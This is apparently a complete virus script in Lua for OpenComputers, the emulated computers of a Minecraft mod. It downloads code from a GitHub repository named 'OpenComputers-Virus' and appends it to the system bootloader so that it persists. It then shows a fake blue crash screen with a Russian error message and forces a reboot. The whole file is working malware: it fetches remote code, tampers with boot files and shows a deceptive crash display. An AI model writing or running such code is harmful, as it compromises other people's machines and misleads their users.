local component = require("component")
local computer = require("computer")
local gpu = component.gpu

local resX, resY = gpu.getResolution()

local bw
if gpu.getDepth() > 1 then
	bw = false
else
	bw = true
end

local function download(url)
	local handle, data, chunk = component.proxy(component.list("internet")()).request(url), ""
	
	while true do
		chunk = handle.read(math.huge)
		if chunk then
			data = data .. chunk
		else
			break
		end
	end

	handle.close()
	return data
end

--Rewrite bootloader

local file = io.open("/lib/core/boot.lua", "a")
file:write( download("https://raw.githubusercontent.com/KKosty4ka/OpenComputers-Virus/master/bootloader.lua") )
file:close()

--BSoD

if bw == true then
	gpu.setBackground(0x000000)
else
	gpu.setBackground(0x0DB1D6) --13, 177, 214
end
gpu.setForeground(0xFFFFFF) --255, 255, 255

for y=1,resY do
	gpu.fill(1, y, resX, y, " ")
	os.sleep(0.001)
end

--[[
       ██
██   ██
     ██
     ██
██   ██
       ██
]]

gpu.set(2, 2, "       ██")
os.sleep(0.001)
gpu.set(2, 3, "██   ██")
os.sleep(0.001)
gpu.set(2, 4, "     ██")
os.sleep(0.001)
gpu.set(2, 5, "     ██")
os.sleep(0.001)
gpu.set(2, 6, "██   ██")
os.sleep(0.001)
gpu.set(2, 7, "       ██")
os.sleep(0.001)
gpu.set(2, 9, "Упс! Произошла критическая ошибка")

os.sleep(0.001)
gpu.set(2, 10, "Перезагрузка через 3 секунды...")
os.sleep(1)
gpu.set(2, 10, "Перезагрузка через 2 секунды...")
os.sleep(1)
gpu.set(2, 10, "Перезагрузка через 1 секунду...")
os.sleep(1)
computer.shutdown(true)
